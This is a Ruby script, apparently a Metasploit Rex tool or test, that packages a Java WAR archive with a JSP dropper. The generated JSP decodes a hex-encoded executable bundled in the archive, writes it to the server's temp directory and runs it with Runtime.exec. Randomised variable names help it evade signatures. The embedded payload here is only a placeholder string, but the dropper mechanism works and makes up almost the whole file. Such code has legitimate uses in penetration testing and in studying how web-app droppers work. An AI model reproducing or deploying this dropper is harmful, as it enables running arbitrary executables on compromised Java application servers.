#!/usr/bin/env ruby
# -*- coding: binary -*-

#
# Create a WAR archive!
#

msfbase = __FILE__
while File.symlink?(msfbase)
  msfbase = File.expand_path(File.readlink(msfbase), File.dirname(msfbase))
end
inc = File.dirname(msfbase) + '/../../..'
$:.unshift(inc)


require 'rex/zip'


def rand_text_alpha(len)
  buff = ""

  foo = []
  foo += ('A' .. 'Z').to_a
  foo += ('a' .. 'z').to_a

  # Generate a buffer from the remaining bytes
  if foo.length >= 256
    len.times { buff << Kernel.rand(256) }
  else
    len.times { buff << foo[ rand(foo.length) ] }
  end

  return buff
end


exe = "exe " * 1024
var_payload = "var_payload"
var_name = "var_name"


zip = Rex::Zip::Archive.new

# begin meta-inf/
minf = [ 0xcafe, 0x0003 ].pack('Vv')
zip.add_file('META-INF/', nil, minf)
# end meta-inf/

# begin meta-inf/manifest.mf
mfraw = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
zip.add_file('META-INF/MANIFEST.MF', mfraw)
# end meta-inf/manifest.mf

# begin web-inf/
zip.add_file('WEB-INF/', '')
# end web-inf/

# begin web-inf/web.xml
webxmlraw = %q{<?xml version="1.0" ?>
<web-app xmlns="http://java.sun.com/xml/ns/j2ee"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee
http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
version="2.4">
<servlet>
<servlet-name>NAME</servlet-name>
<jsp-file>/PAYLOAD.jsp</jsp-file>
</servlet>
</web-app>
}

webxmlraw.gsub!(/NAME/, var_name)
webxmlraw.gsub!(/PAYLOAD/, var_payload)

zip.add_file('WEB-INF/web.xml', webxmlraw)
# end web-inf/web.xml

# begin <payload>.jsp
var_hexpath       = rand_text_alpha(rand(8)+8)
var_exepath       = rand_text_alpha(rand(8)+8)
var_data          = rand_text_alpha(rand(8)+8)
var_inputstream   = rand_text_alpha(rand(8)+8)
var_outputstream  = rand_text_alpha(rand(8)+8)
var_numbytes      = rand_text_alpha(rand(8)+8)
var_bytearray     = rand_text_alpha(rand(8)+8)
var_bytes         = rand_text_alpha(rand(8)+8)
var_counter       = rand_text_alpha(rand(8)+8)
var_char1         = rand_text_alpha(rand(8)+8)
var_char2         = rand_text_alpha(rand(8)+8)
var_comb          = rand_text_alpha(rand(8)+8)
var_exe           = rand_text_alpha(rand(8)+8)
var_hexfile       = rand_text_alpha(rand(8)+8)
var_proc          = rand_text_alpha(rand(8)+8)

jspraw =  "<%@ page import=\"java.io.*\" %>\n"
jspraw << "<%\n"
jspraw << "String #{var_hexpath} = application.getRealPath(\"/\") + \"#{var_hexfile}.txt\";\n"
jspraw << "String #{var_exepath} = System.getProperty(\"java.io.tmpdir\") + \"/#{var_exe}\";\n"
jspraw << "String #{var_data} = \"\";\n"

jspraw << "if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\n"
jspraw << "#{var_exepath} = #{var_exepath}.concat(\".exe\");\n"
jspraw << "}\n"

jspraw << "FileInputStream #{var_inputstream} = new FileInputStream(#{var_hexpath});\n"
jspraw << "FileOutputStream #{var_outputstream} = new FileOutputStream(#{var_exepath});\n"

jspraw << "int #{var_numbytes} = #{var_inputstream}.available();\n"
jspraw << "byte #{var_bytearray}[] = new byte[#{var_numbytes}];\n"
jspraw << "#{var_inputstream}.read(#{var_bytearray});\n"
jspraw << "#{var_inputstream}.close();\n"

jspraw << "byte[] #{var_bytes} = new byte[#{var_numbytes}/2];\n"
jspraw << "for (int #{var_counter} = 0; #{var_counter} < #{var_numbytes}; #{var_counter} += 2)\n"
jspraw << "{\n"
jspraw << "char #{var_char1} = (char) #{var_bytearray}[#{var_counter}];\n"
jspraw << "char #{var_char2} = (char) #{var_bytearray}[#{var_counter} + 1];\n"
jspraw << "int #{var_comb} = Character.digit(#{var_char1}, 16) & 0xff;\n"
jspraw << "#{var_comb} <<= 4;\n"
jspraw << "#{var_comb} += Character.digit(#{var_char2}, 16) & 0xff;\n"
jspraw << "#{var_bytes}[#{var_counter}/2] = (byte)#{var_comb};\n"
jspraw << "}\n"

jspraw << "#{var_outputstream}.write(#{var_bytes});\n"
jspraw << "#{var_outputstream}.close();\n"

jspraw << "Process #{var_proc} = Runtime.getRuntime().exec(#{var_exepath});\n"
jspraw << "%>\n"

zip.add_file("#{var_payload}.jsp", jspraw)
# end <payload>.jsp

# begin <payload>.txt
payloadraw = exe.unpack('H*')[0]
zip.add_file("#{var_hexfile}.txt", payloadraw)
# end <payload>.txt


zip.save_to("test.war")
